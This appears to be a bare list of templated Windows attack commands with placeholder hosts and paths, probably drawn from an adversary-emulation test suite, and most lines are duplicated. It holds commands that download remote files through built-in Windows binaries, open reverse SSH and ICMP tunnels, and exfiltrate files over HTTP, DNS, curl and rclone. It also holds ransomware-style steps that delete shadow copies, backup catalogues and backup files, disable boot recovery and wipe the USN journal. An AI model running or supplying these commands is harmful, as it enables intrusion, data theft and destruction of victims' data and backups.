iwr -URI #{remote_file} -Outfile #{local_path}
Invoke-WebRequest -URI #{remote_file} -Outfile #{local_path}
powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}
powershell.exe Invoke-WebRequest -URI #{remote_file} -Outfile #{local_path}
"cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*""
MpCmdRun.exe -DownloadFile -url ${remote_file} -path ${local_path}"
"cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*""
MpCmdRun.exe -DownloadFile -url ${remote_file} -path ${local_path}"
certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}
certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}
CertReq -Post -config ${remote_distination} ${file_path}
CertReq -Post -config ${remote_distination} ${file_path}
./icmpsh-s.exe -t ${remote_ip}
./icmpsh-s.exe -t ${remote_ip}
.\client
.\client
.\plink.exe -ssh -l ${remote_user} -N -R ${remote_ip}:${remote_port}:127.0.0.1:${local_port} ${remote_ip}
.\plink.exe -ssh -l ${remote_user} -N -R ${remote_ip}:${remote_port}:127.0.0.1:${local_port} ${remote_ip}
echo y | plink.exe ${remote_user}@${remote-_ip} -pw ${remote_password} -2 -4 -T -N -C -R ${remote_ip}:${remote_port}:127.0.0.1:${local_port}
echo y | plink.exe ${remote_user}@${remote-_ip} -pw ${remote_password} -2 -4 -T -N -C -R ${remote_ip}:${remote_port}:127.0.0.1:${local_port}
ssh ${user}@${ip}
ssh ${user}@${ip}
C:\Users\Public\AA_v3.exe -startclient
C:\Users\Public\AA_v3.exe -startclient
AnyDesk.exe
AnyDesk.exe
./knock ${ip} ${ports}
./knock ${ip} ${ports}
cmdl32 /vpn /lan ${tmp_path}\${config_file}
cmdl32 /vpn /lan ${tmp_path}\${config_file}
set r=reg add HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig /f /v & call %r% UpdateOfficeConfigTimestamp /t REG_QWORD /d 99999999999 & call %r% ODSUUpdateXMLUrlFromOC /d a & call %r% UpdateRingSettingURLFromOC /d ${remote_file} & call %r% UpdateXMLUrlFromOC /d a
%localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe
set r=reg add HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig /f /v & call %r% UpdateOfficeConfigTimestamp /t REG_QWORD /d 99999999999 & call %r% ODSUUpdateXMLUrlFromOC /d a & call %r% UpdateRingSettingURLFromOC /d ${remote_file} & call %r% UpdateXMLUrlFromOC /d a
%localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe
c:\windows\system32\spool\tools\PrintBrm.exe -b -d ${remote_file} -f ${new_zip}
c:\windows\system32\spool\tools\PrintBrm.exe -b -d ${remote_file} -f ${new_zip}
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib ${remote_file}
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib ${remote_file}
rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen ${remote_file}
rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen ${remote_file}
"""C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe"" ${remote_file}"
"""C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe"" ${remote_file}"
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe ${remote_file}
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe ${remote_file}
winword.exe ${remote_file}
winword.exe ${remote_file}
Excel.exe ${remote_file}
Excel.exe ${remote_file}
Powerpnt.exe ${remote_file}
Powerpnt.exe ${remote_file}
. .\Invoke-HTTPExfiltration.ps1
Invoke-HTTPExfiltration -target_addr ${dest_ip} -block_sz 100 -inputfile ${in_file} -outputfile ${out_file} -invoke_method GET -masquerade $false
. .\Invoke-HTTPExfiltration.ps1
Invoke-HTTPExfiltration -target_addr ${dest_ip} -block_sz 100 -inputfile ${in_file} -outputfile ${out_file} -invoke_method POST -masquerade $false
. .\Invoke-DnsExfiltration.ps1
Invoke-DnsExfiltration -base_domain ${domain} -outputfile ${out_file} -inputfile ${in_file} -block_sz 50 -block_jitter 0
. .\Invoke-DnsExfiltration.ps1
Invoke-DnsExfiltration -base_domain ${domain} -outputfile ${out_file} -inputfile ${in_file} -block_sz 50 -block_jitter 0 -invoke_tool Invoke-Chrome 
. .\Invoke-DnsExfiltration.ps1
Invoke-DnsExfiltration -base_domain ${domain} -outputfile ${out_file} -inputfile ${in_file} -block_sz 50 -block_jitter 0 -invoke_tool Invoke-IWR 
. .\Invoke-DnsExfiltration.ps1
Invoke-DnsExfiltration -base_domain ${domain} -outputfile ${out_file} -inputfile ${in_file} -block_sz 50 -block_jitter 0 -invoke_tool Invoke-resolve-dnsname
curl -X POST ${web_address} -F "files=@${file_name}"
curl --upload-file ${file_path} ${remote_destination}
C:\Windows\System32\Curl.exe  --upload-file ${file_path} ${remote_destination}
C:\Windows\System32\Curl.exe  -X POST ${remote_destination} -F "files=@${file_path}"
curl ${rclone_conf_url} -o C:\Users\${username}\AppData\Roaming\rclone\rclone.conf
rclone.exe copy ${file_name} ${conf_name}:${folder_name}
net user ${username} /delete
net user ${username} ${nerpassword}
net user ${username} /active:no
net user ${username} /expires:${expire_date}
Remove-LocalUser -Name ${username}
$password = Read-Host -AsSecureString
 Set-LocalUser -name ${username} -password $password
Disable-LocalUser -Name ${username}
Set-LocalUser -name ${username} -AccountExpires ${expire_date}
sdelete.exe -accepteula ${file_path}
sdelete.exe -accepteula ${file_path}
vssadmin.exe delete shadows /all /quiet
vssadmin.exe delete shadows /all /quiet
vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%
vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%
wmic.exe shadowcopy delete
wmic.exe shadowcopy delete
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
wbadmin delete catalog -quiet
wbadmin delete catalog -quiet
wbadmin delete systemstatebackup -keepVersions:0
wbadmin delete systemstatebackup -keepVersions:0
bcdedit /set bootstatuspolicy ignoreallfailures
bcdedit /set recoveryenabled no
bcdedit /set bootstatuspolicy ignoreallfailures
bcdedit /set recoveryenabled no
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
sc.exe stop ${service_name}
sc.exe stop ${service_name}
stop-service ${service_name}
net stop ${service_name}
net stop ${service_name}
taskkill.exe /f /im ${process_name}
taskkill.exe /f /im ${process_name}
taskkill.exe /f /pid ${pid}
taskkill.exe /f /pid ${pid}
shutdown /s /f /t ${timeout}
shutdown /s /f /t ${timeout}
shutdown /r /f /t ${timeout}
shutdown /r /f /t ${timeout}
shutdown /l
shutdown /l
fsutil.exe file setZeroData offset=${offset} length=${length} ${file}
fsutil.exe file setZeroData offset=${offset} length=${length} ${file}
fsutil.exe usn deletejournal /d ${drive}
fsutil.exe usn deletejournal /d ${drive}